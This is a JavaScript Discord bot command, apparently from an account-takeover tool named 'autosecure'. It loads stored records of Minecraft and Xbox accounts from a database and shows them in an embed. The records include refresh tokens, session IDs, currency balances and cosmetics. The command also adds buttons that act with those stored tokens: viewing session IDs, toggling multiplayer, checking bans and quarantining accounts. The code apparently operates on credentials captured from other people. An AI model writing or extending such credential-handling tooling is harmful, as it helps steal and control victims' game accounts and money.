const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const generate = require("../../../autosecure/utils/generate");

module.exports = {
  name: "minecraft",
  userOnly: true,
  callback: async (client, interaction) => {
    try {
      const secureId = generate(32);
      const secureId2 = generate(32);
      const secureId3 = generate(32);
      const secureId4 = generate(32);
      const secureId5 = generate(32);
      const secureId6 = generate(32);
      const uid = interaction.customId.split('|')[1];

      const result = await client.queryParams(`SELECT * FROM extrainformation WHERE uid = ?`, [uid]);
      if (!result || result.length === 0) {
        return interaction.reply({ content: "No data found for this user.", ephemeral: true });
      }

    //  console.log(result)

      let {
        username,
        xblrefresh,
        ssid,
        creationdate,
        changedusername,
        hasmc,
        minecoin,
        playstation,
        capes,
        lunar,
        namechange,
        mcitems
      } = result[0];

            capes = JSON.parse(capes)

      mcitems = JSON.parse(mcitems);

      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId, `minecraftmpenable|${xblrefresh}`]
      );
      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId2, `minecraftmpdisable|${xblrefresh}`]
      );
      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId3, `minecraftssid|${ssid}`]
      );
      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId4, `optifinecape|${ssid}|${username}`]
      );

          await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId5, `checkbanmc|${ssid}`]
      );


      
          await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId6, `quarantinemc|${ssid}`]
      );

      let lunarCosmetics = "No cosmetics";
      if (lunar) {
        try {
          const lunarData = JSON.parse(lunar);
          lunarCosmetics = `${lunarData.cosamount || 0} cosmetics`;
        } catch (e) {
          console.error("Error parsing lunar cosmetics:", e);
        }
      }

      const capesString = Array.isArray(capes) && capes.length > 0 ? capes.join(", ") : "None";

      let games = [];
      if (Array.isArray(mcitems)) {
        games = mcitems.map(item => item.name);

        const indexBedrock = games.indexOf('Minecraft Bedrock');
        if (indexBedrock !== -1) {
          games.splice(indexBedrock, 1);
          games.push('Minecraft Bedrock');
        }

        const indexJava = games.indexOf('Minecraft Java');
        if (indexJava !== -1) {
          games.splice(indexJava, 1);
          games.push('Minecraft Java');
        }
      }

const embed = new EmbedBuilder()
  .setColor(0x87CEEB)
  .setTitle(`Minecraft info for: ${username || "Unknown"}`)
  .addFields(
    { name: "Owns Minecraft", value: `\`\`\`${hasmc === "1" || hasmc === 1 ? "Yes" : "No"}\`\`\``, inline: true },
    { name: "Lunar Cosmetics", value: `\`\`\`${lunarCosmetics}\`\`\``, inline: true },
    { name: "Capes", value: `\`\`\`${capesString}\`\`\``, inline: true },
    { name: "Changed Username", value: `\`\`\`${changedusername === "1" || changedusername === 1 ? "Yes" : "No"}\`\`\``, inline: true },
    { name: "Namechange available", value: `\`\`\`${namechange === "1" || namechange === 1 ? "Yes" : "No"}\`\`\``, inline: true },
    { name: "Creation Date", value: `\`\`\`${creationdate || "Unknown"}\`\`\``, inline: true },
    { name: "Minecoins", value: `\`\`\`${minecoin || "0"}\`\`\``, inline: true },
    { name: "PlayStation Tokens", value: `\`\`\`${playstation || "0"}\`\`\``, inline: true },
    { name: "Games", value: `\`\`\`${games.length > 0 ? games.join(', ') : "None"}\`\`\``, inline: true }
  );



      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`lunarcosmetics|${uid}`)
          .setLabel('Lunar cosmetics')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`labymod|${uid}`)
          .setLabel('Laby cosmetics')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`action|${secureId4}`)
          .setLabel('Optifine Cape')
          .setStyle(ButtonStyle.Primary)
      );

      const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`action|${secureId}`)
          .setLabel('Enable Multiplayer')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`action|${secureId2}`)
          .setLabel('Disable Multiplayer')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`action|${secureId3}`)
          .setLabel('SSID Viewer')
          .setStyle(ButtonStyle.Primary)
      );

      const row3 = new ActionRowBuilder().addComponents(
          new ButtonBuilder()
          .setCustomId(`action|${secureId5}`)
          .setLabel('Check Ban')
          .setStyle(ButtonStyle.Primary), 
          new ButtonBuilder()
          .setCustomId(`action|${secureId6}`)
          .setLabel('Add to Quarantine')
          .setStyle(ButtonStyle.Primary)

      )

      return interaction.reply({
        embeds: [embed],
        components: [row, row2, row3],
        ephemeral: true
      });
    } catch (error) {
      console.error("Error fetching minecraft info:", error);
      return interaction.reply({
        content: "An error occurred while fetching Minecraft information.",
        ephemeral: true
      });
    }
  }
};
